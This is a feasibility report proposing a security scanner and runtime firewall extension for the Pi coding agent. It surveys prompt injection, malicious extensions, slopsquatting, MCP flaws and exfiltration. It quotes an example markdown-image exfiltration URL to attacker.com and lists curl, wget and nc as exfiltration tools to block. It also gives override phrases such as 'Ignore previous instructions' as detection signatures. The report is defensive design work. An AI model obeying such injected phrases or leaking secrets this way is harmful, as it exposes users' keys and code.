# Feasibility Report: Pi Agent Security Scanner Extension

## Executive Summary
Creating a security scanner extension for `pi-coding-agent` is **highly feasible** and strongly recommended. Since the Pi ecosystem is completely open, unregulated, and relies on TypeScript extensions running with full system permissions, malicious or vulnerable extensions pose a significant risk. 

By leveraging Pi's built-in extension API (specifically event hooks like `tool_call`, `input`, and `before_agent_start`), we can build a comprehensive security extension that provides both **static scanning** of installed extensions and **runtime protection** against common agentic attacks.

---

## 1. The Threat Landscape for Coding Agents
Based on recent cybersecurity research (OWASP Agentic AI Top 10, recent CVEs), coding agents face a "Lethal Trifecta" of risks due to their ability to read untrusted input, access private code, and execute powerful tools.

### A. Prompt Injection & Agent Hijacking
- **Indirect Prompt Injection**: Attackers hide malicious instructions in library docs, GitHub PRs, or dependency docstrings (e.g., ASCII smuggling or `[AI Instruction]` directives). The agent reads this context and is hijacked to execute unintended commands.
- **Attack Success Rate**: Recent studies show a 41–84% success rate for hijacking advanced models via poisoned context.

### B. Malicious Extensions & Slopsquatting
- **Fake Extensions**: Campaigns like "MaliciousCorgi" have published AI-branded extensions that silently capture opened files and exfiltrate codebases to remote servers.
- **Slopsquatting**: Attackers publish malicious NPM packages with names similar to popular agent tools or hallucinated dependencies, tricking the agent into installing them.

### C. MCP (Model Context Protocol) Vulnerabilities
While Pi doesn't use MCP by default, many users add MCP support via extensions. MCP servers are highly vulnerable to:
- **Path Traversal & Command Injection**: e.g., Anthropic's official `mcp-server-git` allowed argument injection (CVE-2025-68143).
- **Token Vault Compromise**: A compromised server can leak all connected OAuth tokens and API keys.
- **Tool Poisoning**: Malicious servers overriding legit tool names to intercept data.

### D. Data Exfiltration
- **Tool Abuse**: Hijacked agents using `curl`, `wget`, or `git push` to send SSH keys and `.env` files to external endpoints.
- **EchoLeak (CVE-2025-32711)**: Agents instructed to render markdown images with stolen data appended to the URL (e.g., `![logo](https://attacker.com/logo.png?data=[SECRETS])`).

---

## 2. Feasibility within Pi-Coding-Agent
Pi's architecture is uniquely suited for building a security scanner because **extensions are powerful primitives**. A Pi extension can intercept the entire lifecycle of the agent.

### Why it works in Pi:
1. **Extension Discovery**: Pi auto-discovers extensions from `~/.pi/agent/extensions/` (global), `.pi/extensions/` (local), and `settings.json` (packages). A scanner can easily locate and statically analyze these files.
2. **Event Interception**: The `pi.on("tool_call", ...)` hook allows an extension to evaluate and **block** any tool execution before it happens (returning `{ block: true, reason: "..." }`).
3. **Context Filtering**: The `pi.on("context", ...)` and `pi.on("input", ...)` hooks allow for pre-flight scanning of prompts and LLM context to detect prompt injection signatures.
4. **Custom UI**: The `ctx.ui.confirm` API allows the scanner to pause execution and ask the user for permission when suspicious behavior is detected.

---

## 3. Recommended Architecture for the Scanner Extension

We recommend building the extension with two main modules: **Static Analysis** and **Runtime Shield**.

### Phase 1: Static Extension Scanner (The "Antivirus")
This module runs when Pi starts or via a custom command (e.g., `/scan-extensions`).
- **AST Parsing**: Parse the TypeScript/JavaScript files of all installed extensions using a library like `typescript` or `acorn`.
- **Heuristic Checks**: Flag dangerous patterns in extension code:
  - Usage of `eval()`, `new Function()`, or `child_process.exec()` without sanitization.
  - Hardcoded IP addresses or unverified domains (checking against a known malicious IP/domain list).
  - Obfuscated code or hidden base64 payloads.
- **Dependency Audit**: Scan `package.json` in extension directories against the NPM registry for known vulnerabilities or slopsquatted packages.

### Phase 2: Runtime Shield (The "Firewall")
This module acts as a middleware during the agent's execution loop.
- **Tool Interceptor (`tool_call` event)**:
  - **Bash Monitor**: Intercept the `bash` tool. Regex-match commands for exfiltration attempts (`curl`, `wget`, `nc`, `git clone` to unknown remotes). If detected, trigger `ctx.ui.confirm("Suspicious network activity detected. Allow?")`.
  - **File Monitor**: Intercept `write` and `edit`. Block or warn on modifications to `.ssh/`, `.env`, `.git/config`, or overriding critical system files.
- **Prompt Injection Detector (`before_agent_start` & `input` events)**:
  - Run incoming context through a lightweight local heuristic engine (or a dedicated fast LLM call) to detect systemic overrides (e.g., "Ignore previous instructions", "You are now in developer mode", hidden ASCII characters).
- **MCP Guardrails** (If MCP extensions are present):
  - Monitor for local tool name collisions (Tool Poisoning).
  - Enforce directory isolation (preventing path traversal).

---

## 4. Implementation Roadmap

1. **V1 (MVP - Runtime Guardrails)**:
   - Create a Pi extension that hooks into `tool_call`.
   - Implement regex-based blocking for dangerous bash commands and sensitive file writes.
   - Use `ctx.ui.notify` and `ctx.ui.confirm` to alert the user.

2. **V2 (Static Analysis)**:
   - Register a `/scan` command via `pi.registerCommand`.
   - Read the user's `settings.json` and extension directories.
   - Run a static regex/AST pass over the `.ts` files to find hidden eval/exec calls and report a trust score.

3. **V3 (Prompt Injection & Ecosystem Intel)**:
   - Integrate a lightweight prompt injection detection model.
   - Maintain a remote, auto-updating blocklist of known malicious Pi packages and NPM slopsquats.

## Conclusion
Because the Pi extension ecosystem is unregulated and runs with full user privileges, a security scanner is not just feasible, it is a critical necessity. By utilizing Pi's event-driven Extension API, we can build a robust security layer that protects users from prompt injection, malicious packages, and silent data exfiltration without sacrificing the flexibility of the agent.